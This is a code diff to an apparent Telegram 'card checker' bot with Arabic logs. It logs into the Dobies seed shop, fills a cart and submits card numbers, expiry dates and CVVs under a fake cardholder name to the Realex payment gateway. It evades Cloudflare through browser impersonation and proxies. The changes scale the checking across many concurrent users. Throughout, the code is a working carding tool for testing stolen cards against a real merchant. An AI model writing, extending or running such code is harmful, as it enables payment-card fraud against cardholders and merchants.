@@ -8,6 +8,7 @@ import os
 import re
 import threading
 import time
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
@@ -37,6 +38,10 @@ LOGIN_EMAIL = os.getenv("LOGIN_EMAIL", "")
 LOGIN_PASSWORD = os.getenv("LOGIN_PASSWORD", "")
 PROXY_URL = os.getenv("PROXY_URL", "").strip()
 IMPERSONATE = os.getenv("CURL_IMPERSONATE", "chrome120")
+HTTP_WORKERS = max(10, min(60, int(os.getenv("HTTP_WORKERS", "40"))))
+MAX_REALEX_PARALLEL = max(5, min(30, int(os.getenv("MAX_REALEX_PARALLEL", "15"))))
+MAX_ACTIVE_USERS = max(10, min(100, int(os.getenv("MAX_ACTIVE_USERS", "50"))))
+DASH_UPDATE_INTERVAL = 2.0
 
 LOGGED_IN_MARKERS = (
     "my account", "sign out", "log out", "account-management",
@@ -78,6 +83,63 @@ BASE_HEADERS = {
 # ========== SESSION ==========
 dobies_session = None
 user_sessions: dict = {}
+_http_executor: ThreadPoolExecutor | None = None
+_session_thread_lock = threading.Lock()
+_login_async_lock: asyncio.Lock | None = None
+_guid_async_lock: asyncio.Lock | None = None
+_realex_semaphore: asyncio.Semaphore | None = None
+_guid_waiters = 0
+
+
+def _get_executor() -> ThreadPoolExecutor:
+    global _http_executor
+    if _http_executor is None:
+        _http_executor = ThreadPoolExecutor(max_workers=HTTP_WORKERS, thread_name_prefix="http")
+    return _http_executor
+
+
+def _get_login_lock() -> asyncio.Lock:
+    global _login_async_lock
+    if _login_async_lock is None:
+        _login_async_lock = asyncio.Lock()
+    return _login_async_lock
+
+
+def _get_guid_lock() -> asyncio.Lock:
+    global _guid_async_lock
+    if _guid_async_lock is None:
+        _guid_async_lock = asyncio.Lock()
+    return _guid_async_lock
+
+
+def _get_realex_sem() -> asyncio.Semaphore:
+    global _realex_semaphore
+    if _realex_semaphore is None:
+        _realex_semaphore = asyncio.Semaphore(MAX_REALEX_PARALLEL)
+    return _realex_semaphore
+
+
+def count_active_checks() -> int:
+    return sum(1 for s in user_sessions.values() if s.get("is_running"))
+
+
+def adaptive_card_delay(user_id: int) -> float:
+    base = get_card_delay(user_id)
+    active = count_active_checks()
+    if active >= 40:
+        return base * 2.5
+    if active >= 25:
+        return base * 2.0
+    if active >= 15:
+        return base * 1.5
+    if active >= 8:
+        return base * 1.2
+    return base
+
+
+async def run_blocking(fn, *args):
+    loop = asyncio.get_running_loop()
+    return await loop.run_in_executor(_get_executor(), fn, *args)
 
 
 def mask_card(card: str) -> str:
@@ -286,84 +348,84 @@ def _fetch_checkout_guid(session: curl_requests.Session) -> str | None:
     return None
 
 
-def do_login() -> bool:
+def _add_cart_item(session: curl_requests.Session) -> None:
+    session.post(
+        f"{DOBIES_BASE}/cart-JSON.cfm",
+        headers={
+            **_browser_headers(f"{DOBIES_BASE}/SUSGW2/peony-pink-hawaiian-coral_mh-76854"),
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "x-requested-with": "XMLHttpRequest",
+        },
+        data=(
+            "Quantity=1&addtobasket=1&prodcode=MH322"
+            "&name=Carrot+'Autumn+King+2'+-+Seeds&sku=433811"
+        ),
+        timeout=30,
+    )
+
+
+def _verify_account(session: curl_requests.Session, sign_in_url: str) -> tuple[bool, str]:
+    account = session.get(
+        f"{DOBIES_BASE}/account-management",
+        headers=_browser_headers(sign_in_url),
+        timeout=30,
+    )
+    html = account.text
+    url = str(account.url)
+    if _is_logged_in(html, url) or "My Account" in html:
+        return True, ""
+    snippet = re.sub(r"\s+", " ", html[:300])[:200]
+    if "captcha" in html.lower() or "cloudflare" in html.lower():
+        return False, "captcha/cloudflare"
+    return False, f"status={account.status_code} snippet={snippet}"
+
+
+def _do_login_unlocked() -> bool:
     global dobies_session
     if not LOGIN_EMAIL or not LOGIN_PASSWORD:
-        log.error("LOGIN_EMAIL أو LOGIN_PASSWORD غير مضبوطين في المتغيرات")
+        log.error("LOGIN_EMAIL أو LOGIN_PASSWORD غير مضبوطين")
         return False
 
-    log.info("جاري تسجيل الدخول... (proxy=%s)", "yes" if PROXY_URL else "no")
+    log.info("تسجيل دخول Dobies... (proxy=%s)", "yes" if PROXY_URL else "no")
     session = _new_session()
-    base_hdrs = _browser_headers()
+    sign_in_url = f"{DOBIES_BASE}/sign-in"
+    post_hdrs = {
+        **_browser_headers(sign_in_url),
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": DOBIES_BASE,
+    }
+    creds = {"EmailAddress": LOGIN_EMAIL, "Password": LOGIN_PASSWORD}
 
     try:
-        session.get(DOBIES_BASE + "/", headers=base_hdrs, timeout=30)
-        time.sleep(1)
-
-        sign_in_url = f"{DOBIES_BASE}/sign-in"
-        sign_in_page = session.get(
-            sign_in_url,
-            headers=_browser_headers(DOBIES_BASE + "/"),
-            timeout=30,
-        )
+        session.get(DOBIES_BASE + "/", headers=_browser_headers(), timeout=30)
+        time.sleep(0.8)
+        sign_in_page = session.get(sign_in_url, headers=_browser_headers(DOBIES_BASE + "/"), timeout=30)
         time.sleep(0.5)
 
         if sign_in_page.status_code >= 400:
             log.error("sign-in page HTTP %s", sign_in_page.status_code)
             return False
 
-        form_data = _parse_hidden_fields(sign_in_page.text)
-        form_data.update({
-            "EmailAddress": LOGIN_EMAIL,
-            "Password": LOGIN_PASSWORD,
-        })
+        session.post(sign_in_url, headers=post_hdrs, data=creds, allow_redirects=True, timeout=30)
+        time.sleep(0.8)
+        ok, detail = _verify_account(session, sign_in_url)
 
-        login_resp = session.post(
-            sign_in_url,
-            headers={
-                **_browser_headers(sign_in_url),
-                "content-type": "application/x-www-form-urlencoded",
-                "origin": DOBIES_BASE,
-            },
-            data=form_data,
-            allow_redirects=True,
-            timeout=30,
-        )
-        time.sleep(1)
+        if not ok:
+            hidden = _parse_hidden_fields(sign_in_page.text)
+            if hidden:
+                hidden.update(creds)
+                session.post(sign_in_url, headers=post_hdrs, data=hidden, allow_redirects=True, timeout=30)
+                time.sleep(0.8)
+                ok, detail = _verify_account(session, sign_in_url)
 
-        account = session.get(
-            f"{DOBIES_BASE}/account-management",
-            headers=_browser_headers(sign_in_url),
-            timeout=30,
-        )
-
-        if not _is_logged_in(account.text, str(account.url)):
-            snippet = re.sub(r"\s+", " ", account.text[:300])
-            log.error(
-                "فشل تسجيل الدخول — status=%s url=%s snippet=%s",
-                account.status_code,
-                account.url,
-                snippet[:200],
-            )
-            if "captcha" in account.text.lower() or "cloudflare" in account.text.lower():
-                log.error("الموقع يطلب CAPTCHA/Cloudflare — جرّب PROXY_URL على Railway")
+        if not ok:
+            log.error("فشل تسجيل الدخول — %s", detail)
+            if "captcha" in detail:
+                log.error("Railway IP محظور — شغّل محلياً أو استخدم PROXY_URL")
             return False
 
-        log.info("جاري إضافة منتج للسلة...")
-        session.post(
-            f"{DOBIES_BASE}/cart-JSON.cfm",
-            headers={
-                **_browser_headers(f"{DOBIES_BASE}/SUSGW2/peony-pink-hawaiian-coral_mh-76854"),
-                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "x-requested-with": "XMLHttpRequest",
-            },
-            data=(
-                "Quantity=1&addtobasket=1&prodcode=MH322"
-                "&name=Carrot+'Autumn+King+2'+-+Seeds&sku=433811"
-            ),
-            timeout=30,
-        )
-
+        log.info("إضافة منتج للسلة...")
+        _add_cart_item(session)
         dobies_session = session
         log.info("تسجيل الدخول ناجح — cookies=%d", len(session.cookies))
         return True
@@ -373,32 +435,50 @@ def do_login() -> bool:
         return False
 
 
+def do_login() -> bool:
+    with _session_thread_lock:
+        return _do_login_unlocked()
+
+
 def ensure_session() -> curl_requests.Session | None:
+    with _session_thread_lock:
+        if dobies_session is None and not _do_login_unlocked():
+            return None
+        return dobies_session
+
+
+def invalidate_session() -> None:
     global dobies_session
-    if dobies_session is None and not do_login():
-        return None
-    return dobies_session
-
-
-async def get_guid_with_retry(loop, stats: dict, max_retries: int = 3) -> str | None:
-    for attempt in range(max_retries):
-        session = await loop.run_in_executor(None, ensure_session)
-        if not session:
-            log.warning("لا توجد جلسة — محاولة %d/%d", attempt + 1, max_retries)
-            stats["last_response"] = f"guid_retry:{attempt + 1}"
-            await asyncio.sleep(2)
-            continue
-
-        guid = await loop.run_in_executor(None, lambda s=session: _fetch_checkout_guid(s))
-        if guid:
-            return guid
-
-        log.warning("فشل جلب GUID — محاولة %d/%d", attempt + 1, max_retries)
-        stats["last_response"] = f"guid_retry:{attempt + 1}"
-        global dobies_session
+    with _session_thread_lock:
         dobies_session = None
-        await loop.run_in_executor(None, do_login)
-        await asyncio.sleep(2)
+
+
+async def async_do_login() -> bool:
+    async with _get_login_lock():
+        return await run_blocking(do_login)
+
+
+async def get_guid_with_retry(stats: dict, max_retries: int = 3) -> str | None:
+    global _guid_waiters
+    for attempt in range(max_retries):
+        async with _get_guid_lock():
+            _guid_waiters += 1
+            try:
+                session = await run_blocking(ensure_session)
+                if not session:
+                    stats["last_response"] = f"guid_retry:{attempt + 1}"
+                    continue
+                guid = await run_blocking(_fetch_checkout_guid, session)
+                if guid:
+                    return guid
+                invalidate_session()
+            finally:
+                _guid_waiters -= 1
+
+        log.warning("فشل GUID — محاولة %d/%d (نشط: %d)", attempt + 1, max_retries, count_active_checks())
+        stats["last_response"] = f"guid_retry:{attempt + 1}"
+        await async_do_login()
+        await asyncio.sleep(1.5 + attempt)
 
     return None
 
@@ -420,9 +500,7 @@ async def check_card(card: str, bot_app, user_id: int) -> tuple[str, str]:
     stats["current_card"] = mask_card(card)
 
     try:
-        loop = asyncio.get_running_loop()
-
-        guid = await get_guid_with_retry(loop, stats)
+        guid = await get_guid_with_retry(stats)
         if not guid:
             stats["errors"] += 1
             stats["last_response"] = "guid_error"
@@ -431,43 +509,36 @@ async def check_card(card: str, bot_app, user_id: int) -> tuple[str, str]:
         referer = f"{REALEX_BASE}/card.html?guid={guid}"
         hdrs = {**BASE_HEADERS, "Referer": referer}
 
-        await loop.run_in_executor(
-            None,
-            lambda: requests.post(
+        def _run_realex():
+            requests.post(
                 f"{REALEX_BASE}/3ds2/verifyEnrolled",
                 headers=hdrs, data=base_card_data(cc, guid), timeout=20,
-            ),
-        )
-        await loop.run_in_executor(
-            None,
-            lambda: requests.post(
+            )
+            requests.post(
                 f"{REALEX_BASE}/api/cardIdentification",
                 headers=hdrs, data=base_card_data(cc, guid), timeout=20,
-            ),
-        )
-
-        auth_data = {
-            **base_card_data(cc, guid),
-            "pas_expiry": mmyy,
-            "pas_cccvc": cvv,
-            "pas_ccname": "John Smith",
-            "browserJavaEnabled": "false",
-            "browserLanguage": "ar",
-            "screenColorDepth": "24",
-            "screenHeight": "786",
-            "screenWidth": "1397",
-            "timezoneUtcOffset": "-120",
-            "paymentFormHeight": "660",
-            "paymentFormWidth": "600",
-        }
-
-        resp_auth = await loop.run_in_executor(
-            None,
-            lambda: requests.post(
+            )
+            auth_data = {
+                **base_card_data(cc, guid),
+                "pas_expiry": mmyy,
+                "pas_cccvc": cvv,
+                "pas_ccname": "John Smith",
+                "browserJavaEnabled": "false",
+                "browserLanguage": "ar",
+                "screenColorDepth": "24",
+                "screenHeight": "786",
+                "screenWidth": "1397",
+                "timezoneUtcOffset": "-120",
+                "paymentFormHeight": "660",
+                "paymentFormWidth": "600",
+            }
+            return requests.post(
                 f"{REALEX_BASE}/api/auth",
                 headers=hdrs, data=auth_data, timeout=30,
-            ),
-        )
+            )
+
+        async with _get_realex_sem():
+            resp_auth = await run_blocking(_run_realex)
         data = resp_auth.json()
 
         encoded_creq = (data.get("data") or {}).get("verifyEnrolledResult") or {}
@@ -587,10 +658,14 @@ def create_dashboard_keyboard(user_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(rows)
 
 
-async def update_dashboard(bot_app, user_id: int) -> None:
+async def update_dashboard(bot_app, user_id: int, force: bool = False) -> None:
     stats = get_user_stats(user_id)
     if not stats["dashboard_message_id"] or not stats["chat_id"]:
         return
+    now = time.monotonic()
+    if not force and now - stats.get("_last_dash_update", 0) < DASH_UPDATE_INTERVAL:
+        return
+    stats["_last_dash_update"] = now
     try:
         await bot_app.bot.edit_message_text(
             chat_id=stats["chat_id"],
@@ -680,7 +755,7 @@ async def process_cards(cards: list[str], bot_app, user_id: int) -> None:
 
         stats["current_card"] = mask_card(card)
         stats["checking"] = 1
-        await update_dashboard(bot_app, user_id)
+        await update_dashboard(bot_app, user_id, force=True)
         await check_card(card, bot_app, user_id)
         stats["cards_checked"] += 1
         stats["checking"] = 0
@@ -688,7 +763,7 @@ async def process_cards(cards: list[str], bot_app, user_id: int) -> None:
         await update_dashboard(bot_app, user_id)
 
         if stats["is_running"] and stats["cards_checked"] < stats["total"]:
-            await asyncio.sleep(get_card_delay(user_id))
+            await asyncio.sleep(adaptive_card_delay(user_id))
 
     was_stopped = stats["cards_checked"] < stats["total"]
     db.record_session(
@@ -702,7 +777,7 @@ async def process_cards(cards: list[str], bot_app, user_id: int) -> None:
     stats["checking"] = 0
     stats["current_card"] = ""
     stats["last_response"] = "stopped" if was_stopped else "completed"
-    await update_dashboard(bot_app, user_id)
+    await update_dashboard(bot_app, user_id, force=True)
 
     elapsed = int((datetime.now() - stats["start_time"]).total_seconds()) if stats["start_time"] else 0
     title = i18n.t(user_id, "summary_stopped" if was_stopped else "summary_done")
@@ -756,6 +831,14 @@ async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE, cards:
     if stats["is_running"]:
         await update.effective_message.reply_text(
             i18n.t(user_id, "checking_now"),
+            parse_mode="Markdown",
+        )
+        return
+
+    active = count_active_checks()
+    if active >= MAX_ACTIVE_USERS and not admin_panel.is_admin(user_id):
+        await update.effective_message.reply_text(
+            i18n.t(user_id, "err_queue_full", active=active, max=MAX_ACTIVE_USERS),
             parse_mode="Markdown",
         )
         return
@@ -849,7 +932,8 @@ async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 async def reload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id
     msg = await update.message.reply_text(i18n.t(uid, "reloading"))
-    ok = await asyncio.get_running_loop().run_in_executor(None, do_login)
+    invalidate_session()
+    ok = await async_do_login()
     text = i18n.t(uid, "reload_ok") if ok else i18n.t(uid, "reload_fail")
     await msg.edit_text(text)
 
@@ -992,7 +1076,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
     if data == "reload_session":
         await query.answer(i18n.t(user_id, "reloading_short"))
-        ok = await asyncio.get_running_loop().run_in_executor(None, do_login)
+        invalidate_session()
+        ok = await async_do_login()
         await query.message.reply_text(
             i18n.t(user_id, "reload_ok") if ok else i18n.t(user_id, "reload_fail")
         )
@@ -1065,7 +1150,10 @@ def main() -> None:
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.add_handler(CallbackQueryHandler(button_callback))
 
-    log.info("البوت شغال — فحص تسلسلي")
+    log.info(
+        "البوت شغال — حتى %d مستخدم | %d realex متوازي | %d workers",
+        MAX_ACTIVE_USERS, MAX_REALEX_PARALLEL, HTTP_WORKERS,
+    )
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 
